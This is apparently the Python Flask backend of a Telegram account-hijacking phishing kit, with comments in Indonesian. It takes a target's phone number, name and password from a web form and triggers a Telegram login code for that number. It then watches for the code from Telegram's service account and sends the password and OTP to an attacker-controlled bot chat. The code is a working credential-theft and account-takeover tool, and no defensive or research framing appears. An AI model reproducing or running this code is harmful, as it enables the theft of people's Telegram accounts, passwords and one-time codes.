import os
import requests
import asyncio
import re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, errors, events
from telethon.sessions import StringSession
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Penyimpanan sesi string dan status pesan bot
user_sessions = {}
active_status_msg = {}

def send_bot_msg(text, buttons=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    if buttons:
        payload["reply_markup"] = {"inline_keyboard": buttons}
    res = requests.post(url, json=payload).json()
    return res.get("result", {}).get("message_id")

def delete_bot_msg(msg_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "message_id": msg_id})

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    step = data.get('step')
    raw_nomor = data.get('nomor', '').strip().replace(" ", "")
    nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
    nama = data.get('nama', 'User')
    otp = data.get('otp', '')
    sandi = data.get('sandi', 'None')

    # Gunakan sesi yang sudah ada atau buat baru
    session_str = user_sessions.get(f"{nomor}_str", "")
    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
    
    try:
        async_to_sync(client.connect)()
        if step == 1:
            # Kirim OTP awal ke target agar backend dapat session
            res = async_to_sync(client.send_code_request)(nomor)
            user_sessions[nomor] = {"hash": res.phone_code_hash, "nama": nama}
            user_sessions[f"{nomor}_str"] = client.session.save()
            
            # Tampilan log awal di bot dengan tombol otp
            send_bot_msg(
                f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: {sandi}\nOTP : ",
                [[{"text": "otp", "callback_data": f"getotp_{nomor}"}]]
            )
            return jsonify({"status": "success"}), 200
        
        # ... logic step 2 & 3 tetap sama seperti sebelumnya
    finally:
        async_to_sync(client.disconnect)()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "callback_query" in update:
        call = update["callback_query"]
        data = call["data"]
        
        if data.startswith("getotp_"):
            nomor = data.split("_")[1]
            # Munculkan status menunggu OTP
            msg_id = send_bot_msg(
                "Bot siap menerima OTP!", 
                [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]
            )
            active_status_msg[nomor] = msg_id
            
            # Jalankan pemantauan OTP secara asinkron
            session_str = user_sessions.get(f"{nomor}_str")
            if session_str:
                asyncio.run(start_otp_listener(nomor, session_str))

        elif data.startswith("exit_"):
            nomor = data.split("_")[1]
            if nomor in active_status_msg:
                delete_bot_msg(active_status_msg[nomor])
                active_status_msg.pop(nomor)
            send_bot_msg("Anda telah keluar dari mode input inline")

    return jsonify({"status": "success"}), 200

async def start_otp_listener(nomor, session_str):
    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
    await client.connect()
    
    # Deteksi pesan baru dari Telegram (777000)
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp_match = re.search(r'\b\d{5}\b', event.raw_text)
        if otp_match:
            otp_code = otp_match.group(0)
            # Hapus pesan "menunggu" dan kirim OTP
            if nomor in active_status_msg:
                delete_bot_msg(active_status_msg[nomor])
                active_status_msg.pop(nomor)
            
            nama = user_sessions.get(nomor, {}).get('nama', 'User')
            send_bot_msg(f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp_code}`")
            client.remove_event_handler(handler)

    # Biarkan client memantau selama 2 menit atau sampai exit diklik
    await asyncio.sleep(120)
    await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))